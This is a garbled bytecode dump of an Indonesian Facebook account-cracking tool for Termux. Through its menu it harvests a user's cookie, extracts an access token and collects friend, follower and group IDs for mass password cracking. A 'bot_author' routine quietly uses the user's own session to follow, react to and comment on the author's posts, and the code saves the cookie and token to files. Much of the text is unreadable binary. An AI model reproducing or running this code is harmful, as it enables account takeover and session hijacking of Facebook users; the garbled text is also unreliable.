o
    TN�b�� �                   @   s  d Z dZdZdZdZdZdZddlZddlZddl	Z	zddl
Z
W n ey2   ed	� e�d
� Y nw zddlZW n eyK   ed� e�d� Y nw zddlZW n eyd   ed� e�d� Y nw zddlZW n eyy   e�d� Y nw ddlZddlZddlZddlZddlZddlZddlZddlZddlZddlZddlZddlZddlZddl
Z
ddlZddlZddlZddlZddlZddlZddl
Z
ddlZddlZddlZddlZddlZddlZddlZddlZddlZddlZddlZddlZddlZddlZddlZddlZddl
Z
ddlZddlZddlZddlZddlZddlZddl
Z ddlZddlZddlZddl!m"Z# ddl$m%Z& ddlm'Z( ddl)m*Z+ ddl$m,Z- ddl.m/Z0 ddl	mZ1 ddl2m3Z4 ddl5m6Z7 ddl8m9Z9 ddlm'Z: ddlm'Z; ddlm'Z' ddlm<Z= ddl)m*Z> ddl)m*Z* ddl8m9Z9 ddlmZ ddl?m@Z@ ddlmAZA eBejCd�ZDejEg d�eDejFd �ZGeGdk�r�e�d!� ze�Hd"� W n   Y ze�Hd#� W n   Y ddlZd$ZId%ZJd&ZKd'ZLd(ZMd)ZNd*ZOd+ZPd,ZQd-ZRd.ej�S� v �r'd/ZTd0ZNd1ZUd2ZVd3ZWd4ZXd5ZYd$ZZd5Z[d6Z\d7Z]d-ZRd8eU� d9e[� d:�Z^nd;ZTd;ZNd;ZUd;ZVd;ZWd;ZXd;ZYd;ZZd;Z[d;ZRd;Z\d;Z]d<Z^d=Z_g Z`g Zai Zbi Zcdaddadg aeg afg Zgg Zhg Zii i ZbZcg g Z`Zjg Zkg Zldame�n� Zoepe�n� �qd>��ZreojsZteojuZveojwZxe�n� Zoepe�n� �qd?��Zyepe�n� �qd@��Zze�n� �qdA�Z{dBdCdDdEdFdGdHdIdJdKdLdMdN�Z|g dO�Z}e�n� Z~e~jsZte~juZve~jwZxdBdCdPdEdFdGdHdIdJdKdLdMdN�Z|g dQ�Zzevdk �s�evdRk�r�e��  evdS Z�W n e��y�   e��  Y nw ee� Z�dTexe�etf Z�dUZ�dVZ�dWZ�dXZ�dYZ�dZZ�d[Z�d\Z�d]Z�d^epe� Z�d_d`� Z�daZ�dbZ�dcZ�ddZ�deZ�dfZ�dgdViZ�dhdi� Z�djdk� Z�dldm� Z�G dndo� do�Z�dpdq� Z�drds� Z�dtdu� Z�dvdw� Z�dxdy� Z�G dzd{� d{�Z�d|d}� Z�d~d� Z�d�d�� Z�G d�d�� d��Z�d�d�� Z�d�d�� Z�e
��� Z�G d�d�� d��Z�e�� ���  dS )�zFikri Syahputra SinagazFacebook.com/fikri sinagazInstragram.com/fikri.sinagaz06 HarizV.11l   �#7l l   �;Pn� �    Nz"[!] Sedang Install Module requestsz+python -m pip install requests &> /dev/nullz[!] Sedang Install Module bs4z&python -m pip install bs4 &> /dev/nullz#[!] Sedang Install Module mechanizez,python -m pip install mechanize &> /dev/nullz'python -m pip install gTTS &> /dev/null)�Table)�Console)�BeautifulSoup)�ThreadPoolExecutor)�Group)�Panel)�print)�Markdown)�Columns)�ConnectionError)�choice)�datetime)�quote)�date�w)Zdpkgz-sz
play-audio)�stdout�stderrzpkg install play-audio -y�dump�Hasilz[0;90mz[38;5;196mz
[38;5;46mz[38;5;226mz
[38;5;44mz[1;96mz[38;5;231mz[38;5;208mz[38;5;248mz[0mZlinuxz[1;32mz[0;32mz[0;36mz[0;31mz[0;35mz[0;33mz[00mz[38;2;255;127;0;1mz[0;94m�[�   •�]-->� u   [•]-->z     z%d-%m-%Yz%Y-%m-%dz%Y%m%d�%H:%M:%S�Januari�Februari�Maret�April�Mei�Juni�Juli�Agustus�	September�Oktober�November�Desember)�01�02�03�04�05�06�07Z08�09Z10�11�12)Z100004623370585Z100000415317575Z100000737201966Z100020766075165Z100000431996038Z100026818103201Z100001617352620Z100000729074466Z	607801156Z100009340646547Z
1676993425Z
1767051257Z100000287398094Z100001085079906Z100007559713883Z100004655733027Z100000200420913Z100026490368623Z100010484328037Z100015073506062Z10016189ZMa7ret�r   r   r   r   r   r   r    r!   r"   r#   r$   r%   �   �   z%s-%s-%szpMozilla/5.0 (Linux; Android 3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.66 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]�{nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+z�Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]��Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]z�Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]z�Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]��Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]z�Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]z

https://www.facebook.com/c                  C   sv   g d�} t d�D ],}t�d� tj�dt� dt� dt� dt� dt� d	�| |t| �   d
 � tj�	�  qt
d� d S )N)
u+   [[1;91m■[0m□□□□□□□□□]u+   [[1;92m■■[0m□□□□□□□□]u+   [[1;93m■■■[0m□□□□□□□]u+   [[1;94m■■■■[0m□□□□□□]u+   [[1;95m■■■■■[0m□□□□□]u+   [[1;96m■■■■■■[0m□□□□]u+   [[1;97m■■■■■■■[0m□□□]u+   [[1;98m■■■■■■■■[0m□□]u+   [[1;99m■■■■■■■■■[0m□]u,   [[1;910m■■■■■■■■■■[0m]�2   g�������?z r   r   �] z
Loading...� z[0m r   )�range�time�sleep�sysr   �write�N�H�len�flushr   )Z	animation�i� rC   �0/data/data/com.termux/files/home/Dragon/Crack.py�loading�   s   
@rE   zhttps://business.facebook.com��Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36zILu Ganteng Banget Bang. Gw Mau Recode SClu, Soalnya Gw Goblok Soal Coding�https://www.facebook.com/�https://m.facebook.com/�https://mbasic.facebook.com/�
user-agentc           	   
   C   s�   z_t �� �P}|jd| d�}t|jd�}|�dddi�D ]0}dt|�v rKt�dt|j	���
d	�t�d
t|j	���
d	�dd�}d|d  }|j||| d�}qW d   � W d S 1 sXw   Y  W d S  tyr } zW Y d }~d S d }~ww )Nz%https://mbasic.facebook.com/language/��cookies�html.parser�form�method�postzBahasa Indonesiazname="fb_dtsg" value="(.*?)"r2   �name="jazoest" value="(.*?)")�fb_dtsg�jazoest�submit�https://mbasic.facebook.com�action)�datarL   )�requests�Session�get�par�content�find_all�str�re�search�text�grouprP   �	Exception)	�cookie�xyz�reqZprarB   Zbahasa�url�exec�erC   rC   rD   �language�   s$   
���&�� rj   c              
   C   s�   zOdt dd��� i}d|  }t�� �3}t|j||d�jd�}|jddd	�}t|d
 ��	d�d }t
�dt|���d�}|W  d   � W S 1 sHw   Y  W d S  tyc } z| W  Y d }~S d }~ww )Nrd   �.cookie.txt�rrI   rK   rM   �aZLainnya�Zstring�href�=r2   zowner_id=(.*?)")�open�readrX   rY   r[   rZ   r\   �findr^   �splitr_   r`   rb   rc   )�usernamerd   rg   re   rf   Zkut�idri   rC   rC   rD   �
convert_id�   s   
(���rw   c                 C   s�   t dttttttf � t dtttttf � t dttttttf � t dttttf � t dttttf � t dttttf � t dttttf � t dttttf � t d	ttttttf � t d
ttttf � t�  d S )Nu.   %s╠══[%s•%s] %sTerjadi Kesalahan %s!%su2   %s╠══[%s•%s] %sTidak Dapat Mengeksekusi %su;   %s╠══[%s•%s] %sHal Ini Mungkin Terjadi Karena %s:%su,   %s╠══[%s•%s] %sCookies/Token Invalidu*   %s╠══[%s•%s] %sSalah Memasukkan IDu+   %s╠══[%s•%s] %sBug Pada Source Codeu(   %s╠══[%s•%s] %sBug Pada Requestsu$   %s╠══[%s•%s] %sDan Lain-Lainu;   %s╠══[%s•%s] %sJalankan Ulang Source Code Ini %s:%su)   %s╠══[%s•%s] %spython premium.py
)r   �M�P�A�exit)�errorrC   rC   rD   �kecuali�   s   
r}   c                   @   �4   e Zd Zdd� Zdd� Zdd� Zdd� Zd	d
� ZdS )�
bot_authorc                 C   s\   d| _ || _tt�g}g d�| _|D ]}| �||� | �d|� d�|� | �|||� qd S )Nr   )u   Abg Sayang🥰u   Abg fikri Udh Punya Pacar😘u   Kenalan Yuk Bang😁u   Soalnya Sc Abg Keren😘😘rI   z?v=timeline)�loop�cookie_mentahr^   �Fikri�komen�	get_folls�
get_likers�	get_posts)�selfrd   �tokenr�   Zlist_idrB   rC   rC   rD   �__init__�   s    <zbot_author.__init__c                 C   s�   t �� �L}z(t|jd| |d�jd�jddd�D ]}d|d v r+|jd	|d  |d�}qW n ty? } zW Y d }~nd }~ww W d   � d S W d   � d S 1 sSw   Y  d S )
Nzhttps://mbasic.facebook.com/%srK   rM   rm   T�ro   zsubscribe.phpro   �https://mbasic.facebook.com%s)rX   rY   r[   rZ   r\   r]   rc   )r�   rv   rd   re   rB   Z
exec_follsri   rC   rC   rD   r�   �   s   
("��� ��"�zbot_author.get_follsc           
      C   s  t �� �|}zXt|j||d�jd�}|jddd�D ]4}d|jv rLt�g d��}t|jd|d	  |d�jd��d�D ]}||jkrK|jd
|d	  |d�}q8q8q| �	d
|j
ddd�d	  |� W n tyo }	 zW Y d }	~	nd }	~	ww W d   � d S W d   � d S 1 s�w   Y  d S )NrK   rM   rm   Tr�   ZTanggapi)ZSuperZWowZPedulir�   ro   rU   zLihat Berita Lainrn   )rX   rY   r[   rZ   r\   r]   ra   �randomr   r�   rs   rc   )
r�   rg   rd   re   ZbosrB   Z_react_type_�zZreq2ri   rC   rC   rD   r�   �   s$   

("�"� ��
"�zbot_author.get_likersc           	      C   s  t �� �v}zR|jd||f |d��� d D ]@}dt�| j�d|d  | �� f }t�|j	d|d ||f |d�j
�}d|v rUtd	d
��| j� tdd
��|� tt|�� qW n tyi } zW Y d }~nd }~ww W d   � d S W d   � d S 1 s}w   Y  d S )Nz3https://graph.facebook.com/%s/posts?access_token=%srK   rW   z%s

%s%srG   rv   zAhttps://graph.facebook.com/%s/comments?message=%s&access_token=%sr|   rk   r   �
.token.txt)rX   rY   rZ   �jsonr�   r   r�   �waktu�loadsrP   ra   rq   r=   r�   r{   Z
bot_followrc   )	r�   rv   rd   r�   re   rB   ZkomenorZ   ri   rC   rC   rD   r�   �   s   
""$6��� ��"�zbot_author.get_postsc                 C   sv   g d�t �� jd  }ddddddd	d
�tt �� �d�� }dt �� j|t �� jf }t �� �d�}d|||f }|S )Nr0   r2   ZMingguZSeninZSelasaZRabuZKamisZJumatZSabtu)ZSundayZMondayZTuesdayZ	WednesdayZThursdayZFridayZSaturdayz%Az%s %s %sz%Xz7

Komentar Ditulis Oleh Bot
[ Pukul %s WIB ]
- %s, %s -)r   �now�monthr^   �strftime�day�year)r�   �_bulan_Z_hari_Zhari_iniZjamZtemrC   rC   rD   r�   �   s   &zbot_author.waktuN)�__name__�
__module__�__qualname__r�   r�   r�   r�   r�   rC   rC   rC   rD   r   �   s    r   c                 C   sl   t �� �(}|jtd ttdtdddddd�	d	| id
�}t�d|j��	d�W  d   � S 1 s/w   Y  d S )Nz/business_locationszbusiness.facebook.com�1�#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7�	max-age=0zUtext/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8ztext/html; charset=utf-8)	rJ   �refererZhost�origin�upgrade-insecure-requests�accept-language�cache-control�accept�content-typerd   )�headersrL   z	(EAAG\w+)r2   )
rX   rY   rZ   �url_businness�ua_business�web_fbr_   r`   ra   rb   )rd   re   Zget_tokrC   rC   rD   �clotox  s    

�	�
$�r�   c                 C   s2   | d D ]}t j�|� t j��  t�d� qd S )N�
g;�O��n�?)r<   r   r=   rA   r:   r;   )r�   ri   rC   rC   rD   �jalan  s   2r�   c                 C   s"   z
t �d|  � W d S    Y d S )Nzplay-audio )�os�popen)�xrC   rC   rD   �play_mpv  s   r�   c               	   C   s0   t ttttttttg�} t	t� dt� d�� d S )Nu
  ███████╗    ██╗      ██████╗  ██████╗ ██╗███╗   ██╗
██╔════╝    ██║     ██╔═══██╗██╔════╝ ██║████╗  ██║
███████╗    ██║     ██║   ██║██║  ███╗██║██╔██╗ ██║
╚════██║    ██║     ██║   ██║██║   ██║██║██║╚██╗██║
███████║    ███████╗╚██████╔╝╚██████╔╝██║██║ ╚████║
╚══════╝    ╚══════╝ ╚═════╝  ╚═════╝ ╚═╝╚═╝  ╚═══╝ z.[44m[1;37m Options  [41m[1;37m Login [0m
)
�pilih�B�C�K�U�I�II�O�Qr�   )ZasarC   rC   rD   �kontol  s   �r�   c               	   C   s�   t �d� t�  td� tdtttttttf � ttdtttttf ��} t	�  z9t
| �}d| i}t||| � tdd��|� tdd��| � td	t � td
ttttf � t�d� t�  W d S  tyv   tdt � t��  Y d S w )N�clearr   u:   %s╠══[%s•%s] %sJangan Gunakan Akun Pribadi%s!%s!%su+   %s╠══[%s•%s] %sMasukkan Cookie : %srd   r�   r   rk   u   %s║u<   %s╚══[%s!%s] %sLogin Berhasil, Jalan Kembali Scrip Nya�   z%s[!] Cookie kadaluwarsa!)r�   �systemr�   r   rx   ry   r^   �inputr�   rE   r�   r   rq   r=   r�   r�   r:   r;   r{   �KeyErrorr<   )rd   r�   �cokirC   rC   rD   �login!  s"   
6�r�   c                   @   s�   e Zd Zdd� Zdd� Zdd� Zdd� Zd	d
� Zdd� Zdd� Z	dd� Z
dd� Zdd� Zdd� Zdd� Zdd� Zdd� Zdd� Zdd � Zd!d"� Zd#d$� Zd%d&� Zd'd(� Zd)d*� Zd+d,� Zd-d.� Zd/d0� Zd1d2� Zd3d4� Zd5d6� Zd7d8� Zd9S ):�menuc                 C   s   t �d� | ��  d S )Nr�   )r�   r�   �mani�r�   rC   rC   rD   r�   5  s   
zmenu.__init__c                 C   sL   t ttttttttg�}t}t	|� dt� dt
� dt� dt
� dt� d�� d S )Nr�   u        ██████╗██████╗ ██╗  ██╗ ██████╗██╗  ██╗
     ██╔════╝██╔══██╗██║  ██║██╔════╝██║ ██╔╝
     ██║     ██████╔╝███████║██║     █████╔╝ 
[1;97m     ██║     ██╔══██╗╚════██║██║     ██╔═██╗ 
     ╚██████╗██║  ██║     ██║╚██████╗██║  ██╗
[1;91m  •[1;93m•[1;92m•[1;97m ╚═════╝╚═╝  ╚═╝     ╚═╝ ╚═════╝╚═╝  ╚═╝[1;92m •[1;93m•[1;91m•
[1;94m────────────────────────────────────────────────────                                                               
   [44m[1;37m Script information  [41m[1;37m Version 1.1 [0m

 Author   : zFikri Syahputra Sinaga z
 Coded    : zProjek Samuraizh
 Whatsapp : 6281269495231
 Facebook : fikri syahputra sinaga
 Github   : httsp://github.com/Syafii-XD
 )r�   r�   r�   r�   r�   r�   r�   r�   rx   r�   ry   )r�   �xnxxZvprC   rC   rD   �tampilan_logo9  s   �	�	�
�
�zmenu.tampilan_logoc           	      C   sb  zt dd��� }dt dd��� i}W n   t�  Y zd| }d}W n   d}Y ztjd| |d�}t|� t�|j�d	 }t�|j�d
 }W n%   t	�
d� t	�
d� td� t�d� td� t�d� t	j��  Y | ��  tt� dt� dt� dt� dt� dt� |� t� dt� |� t� dt� |� t� dt� dt� d�� tdt� dt� dt� dt� �� t�d� tdt� dt� �� t�d� tdt� dt� �� t�d� td t� d!t� dt� dt� �� t�d� td"t� d#t� dt� dt� �� t�d� td$t� dt� �� t�d� td%t� dt� �� t�d� td&t� d't� �� t�d� td(t� dt� �� t�d� td)t� d't� �� t�d� td*t� d+t� dt� d,t� �� t�d� td-t� dt� �� t�d� td.t� d,t� �� t�d� td/t� d,t� �� t�d� td0t� dt� �� t�d� td1t� dt� �� t�d� td2t� d,t� �� t�d� td3� t�d� td4t� d5t� d�� t�d� td6� t�d� tt� dt� d7t� d8��}|d9v �r�td:� t�d;� t�  d S |d<v �r	| ��  t	j��  d S |d=v �r| ��  t	j��  d S |d>v �r)| ��  t	j��  d S |d?v �r9| ��  t	j��  d S |d@v �rI| ��  t	j��  d S |dAv �rY| ��  t	j��  d S |dBv �ri| ��  t	j��  d S |dCv �ry| � �  t	j��  d S |dDv �r�| �!�  t	j��  d S |dEv �r�| �"�  tt#dF � t�dG� t�  t	j��  d S |dHv �r�| �$�  t	j��  d S |dIv �r�| �%�  t	j��  d S |dJv �r�| �&�  t	j��  d S |dKv �r�| �'�  t	j��  d S |dLv �r�| �(�  t	j��  d S |dMv �rt)�  t	j��  d S |dNv �r#t	�
d� t	�
d� t*�  tdO� t	j��  d S tdP� t�d;� t�  d S )QNr�   rl   rd   rk   r   zcookie And token�-https://graph.facebook.com/me?access_token=%srK   �namerv   zrm -rf .login.txt�rm -rf .cookie.txtz |-->Cookie Kadaluarsag      �?z |-->Jalanlan Ulang Scriptr   r   r7   zAccount Info/Menuz
 
 Nama Akun      : z
 Id Akun        : z
 Status Login   : z
 Status         : ZPremiumu�   
 ▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️ Informasi Pengguna ◀️◀️◀️◀️◀️◀️◀️◀️◀️◀️◀️◀️◀️◀️ u    ⏩ 01.Crack public and friends(ZMassal�)ZONu    ⏩ 02.Crack public and friends u   ⏩ 03.Crack Dari Followers u   ⏩ 04.Crack Followers Id  (zUltimate Dumpu   ⏩ 05.Crack From Name Search (zNo Loginu   ⏩ 06.Crack From Like Posts u   ⏩ 07.Crack From File u   ⏩ 08.Crack From Comments ZOFFu   ⏩ 09.Crack From Member Group u   ⏩ 10.Crack from Saran Teamn u    ⏩ 11.Check Number of Friends (zProne Check PointZOFu   ⏩ 12.View Crack Results u,   ⏩ 13.Check Facebook Options Crack Results u   ⏩ 14.Auto Share Bots u   ⏩ 15.Laporkan Bung u   ⏩ 16.Info Cookie u6   ⏩ 17.See Related Applications Through Crack Results u   ⏩ 18.Setting User Agentu   ⏩ 00.LOGOUT(zHapus Cookieu�   ▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️�?z]-->Pilihan : �r   r8   z -->Isi Dengan Benar !!r2   )r&   r�   )r'   �2)r(   �3)r)   �4)r*   �5)r+   �6)r,   �7)r-   �9r.   r/   zTekan Enter !�   Z13Z14Z15Z16Z17Z18�00z |-->Cookie Berhasil Dihapus...z$ -->How much do you want to dump? !!)+rq   rr   r�   rX   rZ   rj   r�   r�   ra   r�   r�   r�   r:   r;   r<   r{   r�   r�   r�   r�   rx   r�   r   r�   r�   �public_mass�public_�follow_�dump_follow_ulti�pencarian_nologin�likes_�
crack_file�	menu_grup�cek_jumlah_teman�rek�war�check_opsii�Share_Post_v2�menujuwa�hide_tkn�cek_apk_hasil_crkZugenrE   )	r�   r�   rd   ZxnxzxZzzarZ   �nama�idzZpiorC   rC   rD   r�   L  s�   

 ����������
�**** 





















z	menu.manic                 C   s   zt dd��� }dt dd��� i}W n ty0   t�d� t�d� ttd � t�d� Y nw z
t	t
td	 ��}W n   d
}Y t�� jd d� �� }t d| d d�}tdt d t d � td� tdt� dt� dt� dt� �� td� t|�D �]}|d
7 }t
d| �}z3|dkr�d}n*d�|�dd�}d|v r�|dd�}tjd|d�j}	t|	d�}
|
jdd d!�}|j}|}W n   |}Y d"}zD|dks�d|kr�tjd#||f |d$�}t�|j�}ntjd%| d&|  |d$�}t�|j�}z|d' }W n t tf�y	   d(}Y nw W n% t!�y0 } ztd)t" | t d* t#|� d+ � W Y d }~q~d }~ww td,t | t � zLt d| d d-�}tjd%| d.|  |d$�}t�|j�d/ }|d0 D ]'}z|d1 }|d' }t$�%|d2 | � |�&|d2 | d3 � W �q^   Y �q^W q~ t �y�   Y q~w d4t't$� }|d5k�s�d5|k�r�td6� nItdt"� d7t� d8t� d9�t't$�tf � td:| d | d t � td;� td<� t
td= �}|d>v �r�t(d| d ��)d| d � t�  n	 t
dt� dt� d?�� t*�  d S )@Nr�   rl   rd   rk   �rm -rf .token.txtr�   zToken Failed !!r�   zMau Dump Berapa ID Bang? : r2   �
   �dump/�.txtr   z
 -->Type >�mez< Untuk Dump ID Publik Massalr8   r   �!r   zMasukkan ID Atau Usernamez -->Target %s : �https://m.facebook.com/{}�Lookup�ZfburlZcheck�facebook�https://lookup-id.com/�rW   rM   �span�code�rv   �10000�.https://graph.facebook.com/me/?access_token=%srK   �https://graph.facebook.com/�?access_token=%sr�   �Name Not Found !z-->Sorry ID z This Was Not Found ! (r�   z -->Nama   : �a+�/?fields=friends.fields(id,name)&access_token=%s�friendsrW   rv   �<=>r�   �%s�0z: -->Kemungkinan Idz Yang Anda Masukan Tidak DiPublickan !!r   �]-->Total ID : �%s%sz -->Nama Hasil Dump : z) -->Silahkan Copy Nama Hasil Dump Tadi !!z9 -->Apakah Anda Mau Lasung Crack Dengan File Ini (Y/n) : �-->Pilih : ��Y�yZYesr�   �] Tekan Enter !!)+rq   rr   �IOErrorr�   r�   r{   r�   r:   r;   �intr�   �uuid�uuid4�hex�upperr�   r�   r�   r   rx   r�   r9   �formatrX   rP   r\   r[   rs   ra   rZ   r�   r�   r�   rc   r�   r^   rv   �appendr=   r@   �	crackmenu�passmenur�   )r�   r�   rd   Ztanya_total�namafir   �t�idt�payload�mmk�xxx�idtt�asw�limit�otw�op�jokr�   ri   rl   r�   rB   �uid�zzrC   rC   rD   r�   �  s�   

� 

���$���
(

zmenu.public_massc              
   C   ��  zt dd��� }dt dd��� i}W n ty0   t�d� t�d� ttd � t�d� Y nw t	�
� jd d	� �� }t d
| d d�}tdt d t d � td� tdt� dt� dt� dt� �� td� td�}z3|dkrud}n*d�|�dd�}d|v r�|dd�}tjd|d�j}t|d�}|jddd�}	|	j}
|
}W n   |}Y d }zC|dks�d|kr�tjd!||f |d"�}t�|j�}ntjd#| d$|  |d"�}t�|j�}z|d% }W n ttfy�   d&}Y nw W n- t�y } z td't  | t d( t!|� d) � t�d� t"�  W Y d }~nd }~ww td*t | t � zLt d
| d d+�}tjd#| d,|  |d"�}t�|j�d- }|d. D ]'}z|d/ }|d% }t#�$|d0 | � |�%|d0 | d1 � W �qG   Y �qGW n
 t�yz   Y nw d2t&t#� }|d3k�s�d3|k�r�td4� nItdt � d5t� d6t� d7�t&t#�tf � td8t d
 | d t � td9� td:� ttd; �}|d<v �r�t'd
| d ��(d
| d � t�  n	 tdt� dt� d=�� t"�  d S )>Nr�   rl   rd   rk   r�   r�   �Cookie Failed !!r�   r�   r�   r�   r   z -->Ketik >r�   �< Untuk Dump Data Sendirir8   r   r�   r   zMasukkan User ID Atau Usernamez -->Target :r�   r�   r�   r�   r�   r�   rM   r�   r�   r�   r�   r�   rK   r�   r�   r�   r�   z|-->Sorry ID � Ini Tidak DiTemukan ! (r�   � |-->Nama   : r�   r�   r�   rW   rv   r�   r�   r�   r   �; |-->Kemungkinan Idz Yang Anda Masukan Tidak DiPublickan !!r   r  r  � |-->Nama Hasil Dump : �* |-->Silahkan Copy Nama Hasil Dump Tadi !!�: |-->Apakah Anda Mau Lasung Crack Dengan File Ini (Y/n) : r  r  r  �)rq   rr   r  r�   r�   r{   r�   r:   r;   r
  r  r  r  r�   r�   r�   r   rx   r�   r�   r  rX   rP   r\   r[   rs   ra   rZ   r�   r�   r�   rc   r�   r^   r�   rv   r  r=   r@   r  r  �r�   r�   rd   r  r   r  r  r  r  r  r  r  r  r  r  r�   ri   rl   r�   rB   r  �id_r  rC   rC   rD   r�   
  �   

� 

���$
���
(

zmenu.public_c              
   C   r   )>Nr�   rl   rd   rk   r�   r�   r!  r�   r�   r�   r�   r   � |-->Ketik >r�   r"  � |r   r�   r   � Masukan Idz Atau Username Target� |-->Target :r�   r�   r�   r�   r�   r�   rM   r�   r�   r�   r�   r�   rK   r�   r�   r�   �Nama Tidak DiTemukan !�|-->Maaf ID r#  r�   r$  r�   r�   r�   rW   rv   r�   r�   r�   r   r%  r   r  r  r&  r'  r(  r  r  r  r)  r*  rC   rC   rD   �public_ambil_oldR  r,  zmenu.public_ambil_oldc              
   C   s�  zt dd��� }dt dd��� i}W n ty0   t�d� t�d� ttd � t�d� Y nw t	�
� jd d	� �� }t d
| d d�}tdt d t d � td� tdt� dt� dt� dt� �� td� td�}z3|dkrud}n*d�|�dd�}d|v r�|dd�}tjd|d�j}t|d�}|jddd�}	|	j}
|
}W n   |}Y d }zC|dks�d|kr�tjd!||f |d"�}t�|j�}ntjd#| d$|  |d"�}t�|j�}z|d% }W n ttfy�   d&}Y nw W n- t�y } z td't  | t d( t!|� d) � t�d� t"�  W Y d }~nd }~ww td*t | t � zHt d
| d d+�}tjd#| d, | d-|  |d"��� d. D ]'}z|d/ }|d% }t#�$|d0 | � |�%|d0 | d1 � W �qC   Y �qCW n
 t�yv   Y nw d2t&t#� }|d3k�s�d3|k�r�td4� nItdt � d5t� d6t� d7�t&t#�tf � td8t d
 | d t � td9� td:� ttd; �}|d<v �r�t'd
| d ��(d
| d � t�  n	 tdt� dt� d=�� t"�  d S )>Nr�   rl   rd   rk   r�   r�   r!  r�   r�   r�   r�   r   r-  r�   r"  r.  r   r�   r   r/  r0  r�   r�   r�   r�   r�   r�   rM   r�   r�   r�   r�   r�   rK   r�   r�   r�   r1  r2  r#  r�   r$  r�   �/subscribers?limit=�&access_token=%srW   rv   r�   r�   r�   r   r%  r   r  r  r&  r'  r(  r  r  r  r)  )r�   r�   rd   r  r   r  r  r  r  r  r  r  r  r  r  r�   ri   rB   r  r+  r  rC   rC   rD   r�   �  s�   

� 

���$
��.�
(

zmenu.follow_c              
   C   s  d}zt dd��� }dt dd��� i}W n ty2   t�d� t�d� ttd � t�d	� Y nw t	�
� jd d
� �� }t d| d d�}tdt d t d � td� tdt� dt� dt� dt� �� td� td�}z3|dkrwd}n*d�|�dd�}d|v r�|dd�}tjd|d�j}t|d�}	|	jddd �}
|
j}|}W n   |}Y d!}zC|dks�d|kr�tjd"||f |d#�}t�|j�}ntjd$| d%|  |d#�}t�|j�}z|d& }W n ttfy�   d'}Y nw W n- t�y } z td(t  | t d) t!|� d* � t�d	� t"�  W Y d }~nd }~ww d+}td,t | t � td-� zYt d| d d.�}tjd$| d/ | d0|  |d#��� d1 D ]'}z|d2 }|d& }t#�$|d3 | � |�%|d3 | d4 � W �qK   Y �qKtd5t&t d| d d��'� � � W n   Y ztjd$| d6|  |d#��� d7 d8 }| �(||� W n   Y d9t&t d| d d��'� � }|d:k�s�d:|k�r�td;� n5td<t d | d t � td=� td>� ttd? �}|d@v �r�t)d| d ��*d| d � t�  n	 ttdA � t"�  d S )BNr   r�   rl   rd   rk   r�   r�   r!  r�   r�   r�   r�   r   r-  r�   r"  r.  r   r�   r   r/  r0  r�   r�   r�   r�   r�   r�   rM   r�   r�   r�   r�   r�   rK   r�   r�   r�   r1  r2  r#  r�   Z50000r$  z% |-->Tekan CTRL + C Untuk Stop Dump !r�   r4  r5  rW   rv   r�   r�   � |-->Total ID : %sz'/subscribers?limit=5000&access_token=%s�paging�nextr�   r   r%  r&  r'  r(  zPilih : r  zTekan Enter !!)+rq   rr   r  r�   r�   r{   r�   r:   r;   r
  r  r  r  r�   r�   r�   r   rx   r�   r�   r  rX   rP   r\   r[   rs   ra   rZ   r�   r�   r�   rc   r�   r^   r�   rv   r  r=   r@   �	readlines�ke_situr  r  )r�   Znexttr�   rd   r  r   r  r  r  r  r  r  r  r  r  r  r�   ri   rB   r  r+  r  rC   rC   rD   r�   �  s�   

� 

���$
��.&&


zmenu.dump_follow_ultic           
      C   s�   g }|}|}z:t d| d d�}t�|��� d D ]%}z|d }|d }	|�|d |	 � |�|d |	 d � W q   Y qW n	 tyI   Y nw td	tt d| d d
��	� � � zt�|��� d d }| �
||� W d S    Y d S )Nr�   r�   r�   rW   rv   r�   r�   r�   r6  rl   r7  r8  )rq   rX   rZ   r�   r  r=   r�   r   r@   r9  r:  )
r�   ZxnhaZnamafrv   ZxnnZnamaar   rB   r  r�   rC   rC   rD   r:  0  s&   
�"zmenu.ke_situc                 C   s�   t �� jd d� �� }td| d d�}tdt d | d t � ztt	d��}W n   d}Y t
dt� d	t� �� t
d
� t|�D ]}|d7 }t	d�}t
d
